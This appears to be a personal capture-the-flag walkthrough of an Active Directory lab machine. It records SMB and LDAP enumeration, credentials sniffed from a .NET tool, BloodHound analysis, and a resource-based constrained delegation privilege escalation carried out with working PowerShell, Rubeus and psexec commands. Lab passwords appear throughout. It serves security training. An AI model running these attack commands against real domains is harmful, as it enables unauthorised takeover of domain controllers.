IP: 10.10.11.174
# Enumeration
## Nmap
```bash
Nmap scan report for 10.10.11.174
Host is up (0.032s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-18 15:16:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-18T15:17:04
|_  start_date: N/A
```
Looks like a domain controller cause of port 88 kerberos and dns on 53.
## SMB
Works with null auth.
```bash
smbclient -N -L //10.10.11.174/
```
Has one share that is not standard `support-tools` which has a list of files. 
```
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```
The one that stands out is UserInfo.exe.zip as everything else is a normal tool.

The file is a .net app. Running it gives a connect error.
Checking in wireshark shows it needs the host name of support.htb
Looking again in wireshark when running the app plain text creds are sent.
```
0<...`7.....support\ldap.$nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz0........a.....

......0=...c8..

..

............... givenName..eljay0...sAMAccountName0....h...e...._

. ...X0000208D: NameErr: DSID-03100221, problem 2001 (NO_OBJECT), data 0, best match of:

''

.
```
creds:
```
support\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

## Ldap dump
```bash
ldapsearch -D ldap@support -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -H ldap://10.10.11.174 -s sub -b 'DC=support,DC=htb' > ldap.dump
```
Find unique values for potential passwords.

Found an info field.
```bash
cat ldap.dump | awk -F: '{print $1}' | sort | uniq -c | sort | grep -v '#'
```
This contains a password for the support user
```

support:Ironside47pleasure40Watchful
```
# Bloodhound
## Injester
```bash
python3 bloodhound.py -ns 10.10.11.174 -d support.htb -u support -p 'Ironside47pleasure40Watchful' -c all
```
error with dc.support.htb not resolving.
fixed :)

## Bloodhound data
Support user can PSremote. Also has genericall over the domain controller, which means RBCD attack.

# Foothold
evil-winrm

and user flag :)
# Priv esc
Using the genericall abuse info on bloodhound you can create a machine account which can be used to impersonate a domain admin.

Bloodhound's way
```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Rubeus.exe hash /password:Summer2018!
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```
## The better way
So I have done this attack before without using powerview, instead using the adsi module which is built into powershell. This avoids downloading and running powerview on the machine.

4 steps.
1. Make new computer account
2. Get the SID of the account
3. Add the `allowedtoactonbehalfofotheridentity` attribute to the target. 
4. Get the ticket with rubeus.

### Step 1
Add machine
```powershell
New-MachineAccount -MachineAccount alfheim -Password $(ConvertTo-SecureString 'Wehelpedyoulasttime1!' -AsPlainText -Force)
```
### Step 2
Get the SID.
For a sanity check you can run the below to list out all machine accounts in the domain.
```powershell
$s = New-Object DirectoryServices.DirectorySearcher
$s.Filter = '(&(objectCategory=computer))'
$s.findall()
```

```powershell
$obj = [adsi]"LDAP://CN=alfheim,CN=Computers,DC=support,DC=htb"
$obj.objectsid
```
Convert to string then to binary.
```powershell
$stringSID = (New-Object System.Security.Principal.SecurityIdentifier($obj.objectsid.value,0)).Value

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($stringSID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```
### Step 3
Add the attribute
This doesn't work?
**NOTHING IS WORKING?**
*No I won't use powerview.ps1*


## Confusion?
Lets go insane by reversing the script instead.
```powershell
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
The above is the issue.
`Get-DomainComputer` and `Set-DomainObject`
## Get-DomainComputer
A call to `Get-DomainSearcher`
```powershell
$CompSearcher = Get-DomainSearcher
```
passes a filter on it and then uses `.dispose()`
```powershell
$CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
```
## Get-DomainSearcher
```powershell
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'alfheim$')
```
Does that.

```powershell
$CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'alfheim$')
$CompSearcher.filter = "(samAccountType=805306369)"
```
*Does this work?* nope

(40 min of being completly confused later)

Swap out the name for ldap path. Cause thats what sorta happens in step 2.
It works? (which means something else will be broken)
```powershell
$CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'LDAP://CN=alfheim,CN=Computers,DC=support,DC=htb')
$CompSearcher.filter = "(samAccountType=805306369)"
```
And back to the start.

I have completly no idea.

## Bloodhound's way
Copy paste bloodhound's method but change the name :)

wow look it works. (magic)

Convert the ticket to ccache format
```
cat ticket_b64 | base64 -d > ticket
ticketConverter.py ticket new_ticket
```
Auth with ticket
```
KRB5CCNAME=out psexec.py -k -no-pass support.htb/administrator@dc.support.htb
```
root flag :)